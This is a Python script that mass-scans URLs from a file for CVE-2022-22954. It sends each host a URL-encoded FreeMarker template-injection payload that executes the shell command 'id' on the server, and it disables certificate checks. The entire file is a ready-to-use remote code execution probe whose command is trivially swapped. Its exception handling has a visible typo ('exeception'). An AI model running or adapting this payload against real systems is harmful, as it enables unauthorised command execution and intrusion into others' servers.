#!/usr/bin/python3
import requests
import argparse

def skanowanie(target):
	payload = '/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b"freemarker%2etemplate%2eutility%2eExecute"%3fnew%28%29%28"id"%29%7d'

	with open(target, "r") as addresses:
		for url in addresses:
			url = url.strip()

			final_target = f"{url}{payload}"

			try:
				req = requests.get(final_target, headers=user_agent, timeout=5, verify=False)
				code = req.status_code
				rep = req.text
				# re1 = re.compile(r'device id:(.*?),')
				# rep2 re1.findall(rep)
				# com = rep2[0]
				if code == 400:
					print(f"{url}\t [+] Vulnerable Command:")
				else:
					print(f"{url}\t [-] Not Vulnerable")
			except requests.exeception.RequestException:
				print(f"{url}\t [-] timeout please check the URL")
				continue
			except:
				print(f"{url}\t [-] error please check URL")
				continue

		addresses.close()

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description="CVE-2022-22954 server-side template injection vulnerability scanner")
	parser.add_argument('--url', required=False, help='name of file with target addresses')
	parser.add_argument('--test', required=False, help='python3 exploit.py --url targets.txt')	
	args = parser.parse_args()

	target_url = args.url
	user_agent = {'User-Agent': 'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.7.10) Gecko/20050717 Firefox/1.0.6'}

	skanowanie(target_url)